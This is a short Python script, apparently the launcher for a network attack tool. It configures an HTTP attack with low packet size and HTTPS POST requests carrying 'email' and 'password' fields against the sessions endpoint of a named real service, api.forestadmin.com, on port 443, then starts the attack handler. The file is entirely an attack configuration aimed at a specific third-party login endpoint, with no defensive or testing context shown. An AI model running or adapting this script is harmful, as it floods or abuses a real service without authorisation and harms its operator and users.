from attacks import AttackHandler
from packets import PacketSizes
from shared.attacks import AttackRequest, AttackTypes
from shared.attacks.http import HttpMethods, HttpRequestMeta, HttpSchemas
from shared.attacks.targets import Target


def main() -> None:
    http_payload = ["email", "password"]
    address = "api.forestadmin.com/api/sessions"
    port = 443

    attack_request: AttackRequest = AttackRequest(
        target=Target(address=address, port=port),
        size=PacketSizes.LOW,
        attack_type=AttackTypes.HTTP,
        http_meta=HttpRequestMeta(
            schema=HttpSchemas.HTTPS,
            method=HttpMethods.POST,
            payload=http_payload,
        ),
    )

    attack_handler: AttackHandler = AttackHandler(attack_request=attack_request)
    attack_handler.start()


if __name__ == "__main__":
    main()
